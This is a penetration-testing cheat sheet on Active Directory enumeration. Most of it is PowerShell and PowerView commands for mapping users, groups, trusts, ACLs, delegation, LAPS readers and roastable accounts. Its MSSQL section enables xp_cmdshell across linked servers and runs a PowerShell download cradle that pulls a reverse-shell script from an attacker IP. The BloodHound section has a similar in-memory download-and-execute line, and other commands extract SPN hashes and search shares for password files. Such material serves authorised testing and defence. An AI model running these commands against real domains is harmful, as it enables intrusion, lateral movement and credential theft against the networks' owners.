# Active Directory Enumeration

{% hint style="warning" %}
This page is a long term work in progress page and will be subject to multiple changes overtime.
{% endhint %}

{% hint style="info" %}
The following page is designed to be somewhere between a cheat sheet and a generally informative page regarding Active Directory enumeration
{% endhint %}

{% hint style="info" %}
Where possible a clear distinction will be made between using Powerview (Dev branch) for enumeration and native Windows components. The majority of the techniques are performed in the context of an unprivileged user account.
{% endhint %}

## Enumeration Tools

* **adPEAS:** [https://github.com/61106960/adPEAS](https://github.com/61106960/adPEAS)
* **ADE:** [https://github.com/CasperGN/ActiveDirectoryEnumeration](https://github.com/CasperGN/ActiveDirectoryEnumeration)
* **BloodHound:** [https://github.com/BloodHoundAD/BloodHound](https://github.com/BloodHoundAD/BloodHound)
* **PowerUpSQL:** [https://github.com/NetSPI/PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)
* **Powerview:** [https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)
* **Pywerview:** [https://github.com/the-useless-one/pywerview](https://github.com/the-useless-one/pywerview)

### Install AD PowerShell Module

```bash
# Install capability onto Windows 10/11

# PowerShell
Add-WindowsCapability -Name Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0 -Online

# DISM
DISM.exe /Online /add-capability /CapabilityName:Rsat.GroupPolicy.Management.Tools~~~~0.0.1.0

# Then import module
Import-Module ActiveDirectory
```

#### Manual Copy

If you lack the ability or permissions to install the RSAT module you can clone the repo below and manually copy and import the AD module.

{% embed url="https://github.com/samratashok/ADModule" %}

```
Import-Module .\Microsoft.ActiveDirectory.Management.dll
Import-Module .\ActiveDirectory\ActiveDirectory.psd1
```

## General Enumeration

### Computer Enumeration

#### Powershell

```powershell
# List all computers in current Domain
Get-ADComputer -Filter * | Select Name
Get-ADComputer -Filter * -Properties *

# List all computers and sort by Operating System
Get-ADComputer -Filter 'enabled -eq "true"' `
-Properties 'Name','Operatingsystem','OperatingSystemVersion','IPv4Address' |
Select-Object -Property 'Name','Operatingsystem','OperatingSystemVersion','IPv4Address' | `
Sort-Object -Property 'Operatingsystem'

# List all computers with select Operating System
Get-ADComputer -Filter 'OperatingSystem -Like "*Server*"' -Properties OperatingSystem | Select Name,OperatingSystem

# Get all computers by DNS HostName and then test connection
Get-ADComputer -Filter * -Properties DNSHostName | %{Test-Connection -Count 1 -ComputerName $_.DNSHostName}

# Get Computer objects that have Delegation enabled
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties trustedfordelegation,serviceprincipalname,description
```

#### Powerview

```powershell
# List all computers in current Domain
Get-DomainComputer
Get-DomainComputer | Select Name,Description | Sort Name

# Ping all alive computers in current Domain
Get-DomainComputer -Ping

# List all computers with select Operating System
Get-DomainComputer -OperatingSystem "Windows 10 Pro"
Get-DomainComputer -OperatingSystem "Windows 7*"
Get-DomainComputer -OperatingSystem "Windows 8*"
Get-DomainComputer -OperatingSystem "Windows xp*"

# Get Computer objects that have Unconstrained Delegation
Get-DomainComputer -Unconstrained
```

### Domain Enumeration

#### PowerShell

```powershell
# Domain Information
Get-ADDomain

# Get Domain SID
(Get-ADDomain).DomainSID
```

#### Powerview

```powershell
# Domain Information
Get-NetDomain

# Domain Policy Information
Get-DomainPolicy
(Get-DomainPolicy)."SystemAccess"
(Get-DomainPolicy –domain <Domain>)."systemaccess"
(Get-DomainPolicy)."KerberosPolicy" 

# Get Domain SID
Get-DomainSID
```

#### API

```powershell
$ADClass = [System.DirectoryServices.ActiveDirectory.Domain]
$ADClass::GetCurrentDomain()
```

### Domain Controller Enumeration&#x20;

#### PowerShell

```powershell
# Get all Domain Dontrollers
Get-ADDomainController

# Get Primary Domain Controller
Get-ADForest | Select-Object -ExpandProperty RootDomain |
Get-ADDomain | Select-Object -Property PDCEmulator

# Get Domain Controller in different Domain
Get-ADDomainController -DomainName <Domain> -Discover
```

#### PowerView

```powershell
# Get all Domain Dontrollers
Get-NetDomainController

# Get Primary Domain Controller
Get-NetDomain | Select-Object 'PdcRoleOwner'

# Get Domain Controller in different Domain
Get-NetDomainController -Domain <Domain>
```

### Domain Policy Enumeration

#### PowerShell

```powershell
Get-ADDefaultDomainPasswordPolicy
```

#### PowerView

```powershell
Get-DomainPolicy
(Get-DomainPolicy)."system access"
(Get-DomainPolicy)."Kerberos Policy"
```

### Domain Trust Enumeration

#### PowerShell

```powershell
# Enumerate all Domains in the forest
Get-ADTrust -Filter *
Get-ADTrust -Identity Security.local

# Enumerate external trusts
(Get-ADForest).Domains | %{Get-ADTrust -Filter '(intraForest-ne $True) -and (ForestTransitive -ne $True)' -Server $_}
```

#### PowerView

```powershell
# Enumerate all Domains in the forest
Get-NetForestDomain

# Get all Domains in Forest then list each Domain trust
Get-NetForestDomain -Verbose | Get-DomainTrust

# Map all reachable Domain trusts
Get-DomainTrustMapping
Get-DomainTrustMapping | Select SourceName,TargetName,TrustType,TrustDirection

# List external trusts
Get-NetForestDomain -Verbose | Get-DomainTrust |?{$_.TrustType -eq 'External'}

# Enumerate trusts across the domain
Get-DomainTrust

# Find users in the current Domain that reside in Groups across trusts
Find-ForeignUser
```

### **Forest Enumeration**

**PowerShell**

```powershell
# Get details about current Forest
Get-ADForest -Filter *
Get-ADForest -Identity <Forest>

# Get all Domains in current Forest
(Get-ADForest).Domains

# Get global catalogs in current Forest
Get-ADForest | Select -ExpandProperty 'GlobalCatalogs'

# Map Forest trusts
Get-ADTrust -Filter 'msDS-TrustForestInfo -ne "$null"'
Get-ADForest | %{Get-ADTrust -Filter *}

# List only external trusts
(Get-ADForest).Domains | ` 
%{Get-ADTrust -Filter '(intraForest-ne $True) -and (ForestTransitive -ne $True)' -Server $_}
```

**PowerView**

```powershell
# Get details about current Forest
Get-NetForest
Get-NetForest -Forest <Forest>

# Get all Domains in current Forest
Get-NetForestDomain
Get-NetForestDomain -Forest <Forest>

# Get global catalogs in current Forest
Get-NetForestCatalog
Get-NetForestCatalog -Forest <Forest>

# Map Forest trusts
Get-NetForestTrust
Get-NetForestTrust -Forest <Forest>
```

**.NET**

```powershell
# Get details about current Forest
[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentFo
```

### Group Enumeration

#### **PowerShell**

```powershell
# Get all Groups in the Domain
Get-ADGroup -Filter "*" | Select 'Name'
Get-ADGroup -Filter "*" -Properties "*"

# Search for Groups with partial wildcard
Get-ADGroup -Filter 'Name -Like "*admin*"' | Select 'Name'

# Get members of group
Get-ADGroupMember -Identity <Group> -Recursive

# Get Group member of select user
Get-ADPrincipalGroupMembership -Identity <Username>
```

#### **PowerView**

```powershell
# List all Groups in current Domain
Get-NetGroup
Get-NetGroup -Properties SamAccountName | Sort SamAccountName

# List all Groups in alternative Domain
Get-NetGroup –Domain <Domain>

# Search for Groups with partial wildcard
Get-NetGroup "*admin*"
Get-NetGroup "*admin*"-Properties SamAccountName | Sort SamAccountName

# List all local groups on Domain system
Get-NetLocalGroup -ComputerName <Hostname>

# Identify interesting groups on a Domain Controller
Get-NetDomainController | Get-NetLocalGroup

# Get all domain controllers then get each group and list members  
Get-NetDomainController | Get-NetLocalGroup | Select -ExpandProperty GroupName | Get-NetGroupMember | Select GroupName,MemberName | Sort GroupName

# Get All groups and members of groups
Get-NetGroup | Get-NetGroupMember | Select GroupName,MemberName | Sort GroupName

# List Groups of which a user is a member of
Get-NetLocalGroup -Username '<Username>'
```

### Group Policy Enumeration

#### **PowerShell**

```powershell
# Get all GPO's
Get-GPO -All

# Generate RSOP report
Get-GPResultantSetOfPolicy -ReportType Html -Path "C:\Windows\Temp\Report.html"
```

#### **PowerView**

```powershell
# Get GPO's in Domain
Get-DomainGPO
Get-DomainGPO -Properties DisplayName,CN

# Get GPO applied to specific OU
Get-DomainGPO -ADSpath `
((Get-NetOU "StudentMachines" -FullData).gplink.split(";")[0] -replace "^.")

# Get GPO applied to system
Get-DomainGPO -ComputerIdentity <FQDN>
Get-DomainGPO -ComputerIdentity <FQDN> | Select DisplayName,CN

# Get GPO applied to a User
Get-DomainGPO -UserIdentity <SamAccountName>
Get-DomainGPO -UserIdentity <SamAccountName | Select DisplayName,CN

# Get GPO Restricted Groups
Get-NetGPOGroup
Get-NetGPOGroup -ResolveMembersToSIDs

# Get users which are in a local group of a machine using GPO
Find-GPOComputerAdmin –Computername <FQDN>

# Determines what users/groups are in the specified local group for the machine through GPO correlation
Find-GPOLocation -ComputerName <FQDN>

# Get GPO Permissions
Get-DomainGPO | Get-ObjectAcl
```

### Organizational Units Enumeration

#### **PowerShell**

```powershell
# Get all OU's in Domain
Get-ADOrganizationalUnit -Filter * -Properties *
```

#### **PowerView**

```powershell
# Get all OU's in Domain
Get-DomainOU
Get-DomainOU -Domain <Domain>
Get-DomainOU -Properties OU,DistinguishedName | Sort OU

# Get all OU names by wildcard 
Get-DomainOU "*admin*" 
Get-DomainOU "*test*" 
Get-DomainOU "*server*" 
Get-DomainOU "*work*"
```

### User Eumeration

#### **PowerShell**

```powershell
# List all users and properties
Get-ADuser -Filter * -Properties *

# List specific user account
Get-ADuser -Identity <Username> -Properties *

# List user accounts that are trusted for Delegation
Get-ADUser -Filter {TrustedForDelegation -eq $true}
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDs-AllowedToDelegateTo

# Get all users password last set time
Get-ADUser -Filter * -Properties * | select-object ` 
"name",@{expression={[datetime]::fromFileTime($_.pwdlastset)}}

# Search for string in User Description field
Get-ADUser -Filter 'Description -like "*built*"' `
-Properties Description | Select-Object 'Name','Description'
```

#### **PowerView**

```powershell
# List all user accounts in Domain
Get-DomainUser

# List enabled user accounts
Get-DomainUser -UACFilter NOT_ACCOUNTDISABLE -Properties Name,SamAccountName,Description | Sort Name
Get-DomainUser -UACFilter NOT_ACCOUNTDISABLE -Properties Name,Description,pwdlastset,badpwdcount | Sort Name

# List specific user account
Get-DomainUser -Username <Username>

# Getcurrently logged on users from selected system
Get-NetLoggedon -ComputerName <Hostname>

# Get last logged user on a remote computer (Requires admin and remote registry)
Get-LastLoggedOn -ComputerName <Hostname>

# Get kerberoastable users
Get-DomainUser -SPN | select Name,SrvicepPincipalnNme

# Get AS-REP roastable users
Get-DomainUser -PreauthNotRequired | select Name

# Search for string in User Description field
Get-DomainUser -Properties samaccountname,description | Where {$_.description -ne $null}
```

## Other

### Access Control Lists

#### **PowerShell**

```powershell
# Get ACLs for specific AD Object (No Guid resolve)
(Get-Acl 'AD:\CN=Administrator,CN=Users,DC=Security,DC=local').Access

# Search for objects which have "GenericAll" rights over a specified user
(Get-ACL "AD:$((Get-ADUser <User>).distinguishedname)").access  | ? {$_.ActiveDirectoryRights -match "WriteProperty" -or $_.ActiveDirectoryRights -match "GenericAll"} | Select IdentityReference,ActiveDirectoryRights -Unique | ft -W
```

#### **PowerView**

```powershell
# Get ACLs for specific AD Object
Get-DomainObjectAcl -SamAccountName <SAM> -ResolveGUIDs
Get-DomainObjectAcl -Identity <Identity> -ResolveGUIDs

# Get ACLs for specified prefix
Get-DomainObjectAcl -ADSprefix 'CN=Administrators,CN=Users' -Verbose

# Search for interesting ACEs
Find-InterestingDomainAcl -ResolveGUIDs

# Get ACL for specific path
Get-PathACL -Path "\\Security.local\SYSVOL"

# Get the ACLs associated with the specified LDAP path to be used for search
Get-DomainObjectAcl -ADSpath "LDAP://CN=DomainAdmins,CN=Users,DC=Security,DC=local" -ResolveGUIDs -Verbose
```

### AppLocker

#### **PowerShell**

```bash
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

### AS-REP Roastable Users

<pre class="language-powershell"><code class="lang-powershell"><strong># PowerShell
</strong><strong>Get-ADUser -Filter * -Properties DoesNotRequirePreAuth | Where-Object {$_.DoesNotRequirePreAuth -eq $True -and $_.Enabled -eq $True} | Select-Object 'SamAccountName','DoesNotRequirePreAuth' | Sort-Object 'SamAccountName'
</strong><strong>
</strong><strong># PowerView
</strong>Get-DomainUser -PreauthNotRequired | select UserPrincipalName
</code></pre>

{% content-ref url="credential-access/steal-or-forge-kerberos-tickets/as-rep-roasting.md" %}
[as-rep-roasting.md](credential-access/steal-or-forge-kerberos-tickets/as-rep-roasting.md)
{% endcontent-ref %}

### Kerberoastable Users

**PowerView**

```powershell
Get-DomainUser -SPN | Select SamAccountName,serviceprincipalname | Sort SamAccountName
```

{% content-ref url="credential-access/steal-or-forge-kerberos-tickets/kerberoasting.md" %}
[kerberoasting.md](credential-access/steal-or-forge-kerberos-tickets/kerberoasting.md)
{% endcontent-ref %}

### DCSync Rights

**PowerView**

```powershell
$d = Get-ObjectACL "DC=Domain,DC=local" -ResolveGUIDs | ? { ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ObjectAceType -match 'Replication-Get')} | Select-Object -ExpandProperty SecurityIdentifier | Select -ExpandProperty value ; Convert-SidToName $d
```

{% content-ref url="credential-access/Credential-Dumping/dcsync/" %}
[dcsync](credential-access/Credential-Dumping/dcsync/)
{% endcontent-ref %}

### Delegation - Constrained

#### PowerShell

```powershell
# Search both users and computers for Constrained Delegation
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```

#### PowerView

```powershell
# Get computer Constrained Delegation
Get-DomainComputer -TrustedToAuth | Select DnsHostName,UserAccountControl

# Get user Constrained Delegation
Get-DomainUser -TrustedToAuth
```

### Delegation - Unconstrained

#### PowerShell

```powershell
# Get computers with Unconstrained Delegation
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties trustedfordelegation,serviceprincipalname,description

# Get users with unconstrained Delegation
Get-ADUser -Filter {TrustedForDelegation -eq $true} -Properties trustedfordelegation,serviceprincipalname,description
```

#### PowerView

```powershell
# Get computers with unconstrained delegation
Get-DomainComputer -Unconstrained | Select DnsHostName,UserAccountControl
```

{% embed url="https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/unconstrained-delegation" %}

### Deleted Users

If we are a member of the AD group "AD Recycle Bin" we can view deleted user objects in PowerShell.

```powershell
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```

### LAPS Enumeration

#### LAPS Delegation

The following can be used to identify what objects have the ability to read the LAPS password property for a specified computer inside the domain

#### Powerview

```powershell
Get-NetComputer -ComputerName '<Hostname>' -FullData |
    Select-Object -ExpandProperty distinguishedname |
    ForEach-Object { $_.substring($_.indexof('OU')) } | ForEach-Object {
        Get-ObjectAcl -ResolveGUIDs -DistinguishedName $_
    } | Where-Object {
        ($_.ObjectType -like 'ms-Mcs-AdmPwd') -and
        ($_.ActiveDirectoryRights -match 'ReadProperty')
    } | ForEach-Object {
        Convert-NameToSid $_.IdentityReference
    } | Select-Object -ExpandProperty SID | Get-ADObject
```

Get ACL's where objects are allowed to read the LAPS password property.

#### Powerview

```powershell
Get-NetOU -FullData | 
    Get-ObjectAcl -ResolveGUIDs | 
    Where-Object {
        ($_.ObjectType -like 'ms-Mcs-AdmPwd') -and 
        ($_.ActiveDirectoryRights -match 'ReadProperty')
    } | ForEach-Object {
        $_ | Add-Member NoteProperty 'IdentitySID' $(Convert-NameToSid $_.IdentityReference).SID;
        $_
    }
```

{% embed url="https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/laps" %}

### MSSQL Enumeration

#### PowerUpSQL

```powershell
# Discovery (SPN Scanning)
Get-SQLInstanceDomain

# Check Accessibility
Get-SQLConnectionTestThreaded
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose

#Gather Information
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose

# Search for database links to remote servers
Get-SQLServerLink -Instance <Instance> -Verbose
Get-SQLServerLinkCrawl -Instance <Instance> -Verbose

# Where instance user matches "sa"
Get-SQLServerLinkCrawl -Instance <Instance> | Where-Object {$_.User -match 'sa'}

# Execute commands ( If xp_cmdshell or RPC out is set to enabled)
# If AV is enabled run cradled scripts with functions inline with the script
EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT "<Instance>"
Get-SQLServerLinkCrawl -Instance <Instance> "exec master..xp_cmdshell 'whoami'" -Query

# Scan for misconfigurations and vulnerabilities
Invoke-SQLAudit -Verbose -Instance <Server>
```

#### SQL Commands

```powershell
# Search for database links
select * from master..sysservers

# Manually searching for Database Links
select * from openquery("<Server>",'select * from master..sysservers')

# Openquery queries can be chained to access links within links (nested links)
select * from openquery("dcorp-sql1",'select * from openquery("<Server>",''select * from master..sysservers'')')

# From the initial SQL server, OS commands can be executed using nested link queries
select * from openquery("dcorp-sql1",'select * from openquery("<Server>",''select * from openquery("eu-sql.eu.eurocorp.local",''''select@@version as version;exec master..xp_cmdshell "powershellwhoami)'''')'')')
```

### MSSQL - PowerupSQL exploit example

Search for accessible instances in current domain

```bash
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose

ComputerName                           Instance                                    Status
------------                           --------                                    ------
mssql-srv.security.local             mssql-srv.security.local,1433                Accessible
Mgmtsrv01.security.local             mgmtsrv01.security.local,1433                Not Accessible
```

Run the `Get-SQLServerLinkCrawl` on an accessible instance.

```bash
Get-SQLServerLinkCrawl -Instance mssql-srv.security.local -Verbose


Version     : SQL Server 2017
Instance    : mssql-master-srv
CustomQuery :
Sysadmin    : 1
Path        : {mssql-srv, mssql-srv-eu, mssql-master-srv}
User        : sa
Links       :
```

From the results above the server `mssql-master-srv` is the enterprise level MSSSQL server running with "sa" privileges. The path field shows in order how this is accessible starting with `mssql-srv`. We can check for command execution specifying the first accessible instance in the path which, in this case is `mssql-srv`.

```
Get-SQLServerLinkCrawl -Instance "mssql-srv" -Query "exec master..xp_cmdshell 'whoami'"

Version     : SQL Server 2017
Instance    : mssql-master-srv
CustomQuery : {nt authority\network service, }
Sysadmin    : 1
Path        : {mssql-srv, mssql-srv-eu, mssql-master-srv}
User        : sa
Links       :
```

With confirmed command execution under the "sa" account on the `mssql-master-srv` we can then connect remotely by executing a `PowerShell` download cradle

```powershell
Get-SQLServerLinkCrawl -Instance mssql-srv -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://<IP>/Invoke-PowerShellTcp.ps1'')"' -E df
```

### Shares and Files Enumeration

#### PowerView (Shares)

```powershell
# Find available shares on hosts in the current Domain
Find-DomainShare -Verbose

# Get all file servers on Domain
Get-DomainFileServer

# List all shares on specific domain system
Get-NetShare -ComputerName <Host>
```

**PowerView (Files)**

<pre class="language-powershell"><code class="lang-powershell"># Various
<strong>Find-InterestingDomainShareFile -verbose
</strong>Find-InterestingDomainShareFile -OfficeDocs
Find-InterestingDomainShareFile -Include *.ps1,*.bak,*.vbs,*.config,*.conf
Find-InterestingDomainShareFile -Terms account*,pass*,secret*,conf*,test*,salar*

# Append the following to end of command to explort into an easy to read list
| Select -ExpandProperty "Path" | Sort | Out-File FilePaths.txt

# Example
Find-InterestingDomainShareFile | Select -ExpandProperty "Path" | Sort | Out-File Paths.txt
</code></pre>

**Snaffler**

```
Snaffler.exe -Command "-s -d Domain.local -o snaffler.log -v data"
```

### SPN Enumeration

#### PowerShell

```powershell
# Get all accounts where SPN is not null
Get-ADUser -Filter * -Properties * | Where {$_.ServicePrincipalName -ne $null} | Select 'Name','ServicePrincipalName'
# Exclude krbtgt
Get-ADUser -Filter * -Properties * | Where {$_.ServicePrincipalName -ne $null -and $_.Name -ne 'krbtgt'} | Select 'Name','ServicePrincipalName'
```

#### PowerView

```powershell
# find all users with an SPN set (likely service accounts)
Get-DomainUser -SPN

# find all service accounts in "Domain Admins"
Get-DomainUser -SPN | ?{$_.memberof -match 'Domain Admins'}

# Get Specific user SPN hash
Get-DomainUser -Identity <User> | Get-DomainSPNTicket | select -ExpandProperty Hash
```

### User Hunting

#### PowerView

```powershell
# Find all machines on domain where current user has local admin privileges
Find-LocalAdminAccess -Verbose
Find-LocalAdminAccess -ComputerDomain <Domain> -Verbose

# Find computers where domain administrators or specified user / group has session
Invoke-UserHunter
Invoke-UserHunter -Domain <Domain>
Invoke-UserHunter -GroupName "RDPUsers"
Invoke-UserHunter -Stealth # Makes less noise
Invoke-UserHunter -CheckAccess # Confirm access

# Find computers where all and any users / groups have session
Invoke-UserHunter -ShowAll
Invoke-UserHunter -ShowAll -CheckAccess # Check if accessible

# Find local admins on all machines of the domain (needs local admin rights on target).
Invoke-EnumerateLocalAdmin –Verbose

# Get users logged on to the local system
Get-NetLoggedon

# Get actively logged users on a computer (needs local admin rights on the target)
Get-NetLoggedon –ComputerName <Hostname>
Get-DomainComputer | Get-NetLoggedon # All Systems

# Get locally logged users on a computer (needs remote registry on the target - started by-default on server OS)
Get-LoggedonLocal -ComputerName <Hostname>
Get-DomainComputer | Get-LoggedonLocal # All Systems

# Get the last logged user on a computer (needs administrative rights and remote registry on the target)
Get-LastLoggedOn –ComputerName <Hostname>

# Poll asystem for when a particular user accesses a resource
Invoke-UserHunter -ComputerName <Hostname> -Poll 100 -UserName <user> -Delay 5 -Verbose
```

## Administrative User Identification

### Local System Enumeration

Windows allows any basic authenticated domain user to enumerate the members of a local group on a remote machine.

#### PowerView

```powershell
Get-NetLocalGroup -ComputerName <Hostname>

# With API Call
Get-NetLocalGroup -ComputerName <Hostname> -API

# Get list of effective users who can access a remote host
Get-NetLocalGroup -ComputerName <Hostname> -Recurse
```

#### WinNT Service

```powerquery
([ADSI]'WinNT://<Hostname>/Administrators').psbase.Invoke('Members') |
%{$_.GetType().InvokeMember('Name', 'GetProperty', $null, $_, $null)}
```

### Domain Group Enumeration

#### PowerShell

```powershell
# Find security groups which contain "*admin*".
Get-ADgroup -filter {GroupCategory -eq 'Security' -AND Name -like '*admin*'}
```

#### PowerView

```powershell
# Retrieve members of the Domain Admins group
Get-DomainGroupMember -GroupName "Domain Admins"
```

### AdminCount = 1

This can produce false positives as the AdminCount value is not always automatically updated when an account has been disabled or removed from a Group that provides privileged permissions.

#### PowerShell

```powershell
Get-ADObject -LDAPFilter "(&(admincount=1)(|(objectcategory=person)(objectcategory=group)))" | Select-Object DistinguishedName, Name
```

#### PowerView

```powershell
# Identify Privileged accounts without querying groups
Get-DomainUser -AdminCount | select name,whencreated,pwdlastset,lastlogo
```

### AD Groups with Local Admin Rights

Often times in domain environments domain user accounts are given member to a workstations local group 'Administrators'.

#### PowerView

```powershell
Get-NetGPOGroup
Get-NetGroupMember -GroupName "Local Admin"
```

### Virtual Admins

Virtual Admins usually have full access to the virtualization platform identifying and owning these accounts can often give total control over to an attacker.

#### PowerView

```powershell
Get-NetGroup "*Hyper*" | Get-NetGroupMember
Get-NetGroup "*VMWare*" | Get-NetGroupMember
```

### Systems with Admin Rights

Finding computer accounts with a `$` sign at the end of the hostname in an admin group we can then compromise the system and obtain SYSTEM privileges. The SYSTEM account on the compromised computer would then have AD admin privileges.

#### PowerView

```powershell
Get-NetGroup "*admins*" | Get-NetGroupMember -Recurse |?{$_.MemberName -Like '*$'}
```

## Tools

## Bloodhound

### Ingestors

```bash
# Standard local execution
./SharpHound.exe --CollectionMethod All
Invoke-BloodHound --CollectionMethod All
Invoke-BloodHound --CollectionMethod All -CompressData -RemoveCSV
Invoke-BloodHound -CollectionMethod All,GPOLocalGroup
Invoke-BloodHound -CollectionMethod LoggedOn

# Specify different domain and run in stealth mode and collect only RDP data
Invoke-BloodHound --d <Domain> --Stealth --CollectionMethod RDP

# Run in context of different user
runas.exe /netonly /user:domain\user 'powershell.exe -nop -exec bypass'

# Download and execute in memory
powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('http://<IP>:/SharpHound.ps1');Invoke-BloodHound"

# Metasploit
use post/windows/gather/bloodhound     
```

### Custom Queries

Add the queries below into BloodHound for further queries.

* **CompassSecurity:** [https://github.com/CompassSecurity/BloodHoundQueries](https://github.com/CompassSecurity/BloodHoundQueries)
* **Hausec:** [https://github.com/hausec/Bloodhound-Custom-Queries](https://github.com/hausec/Bloodhound-Custom-Queries)
* **Seajaysec:** [https://gist.github.com/seajaysec](https://gist.github.com/seajaysec)

Replace the `customqueries.json` with one of the below files to update the custom queries within Bloodhound. Remember to restart Bloodhound after changing the JSON file.

**Locate custom queries file**

```
sudo find / -type f -name customqueries.json 2>/dev/null
```

**Note:** Keep in mind that Bloodhound captures a 'snapshot' of the current state of Active Directory at the time of capture and as such results may change when captured again in the future.

## Additional Notes

If Constrained Language mode is enabled on the target Domain Controller, Powerview will be heavily restricted for Domain enumeration. However, the AD PowerShell module will not be limited and allow Domain enumeration to continue.

## Lab Reviews:

**Ryan412:** [https://github.com/ryan412/ADLabsReview](https://github.com/ryan412/ADLabsReview)
